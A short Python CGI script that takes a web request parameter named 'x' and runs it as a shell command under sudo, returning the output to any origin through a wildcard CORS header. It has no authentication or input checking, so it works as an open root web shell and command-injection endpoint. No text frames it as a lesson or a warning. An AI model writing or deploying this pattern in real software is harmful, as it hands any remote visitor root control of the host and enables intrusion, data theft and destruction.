#!/usr/bin/python3
print("Access-Control-Allow-Origin: *")
print("content-type: text/html")
print()
import subprocess
import cgi

x = cgi.FieldStorage()
x1 = x.getvalue("x")
x2 = subprocess.getoutput("sudo "+x1)
print(x2)
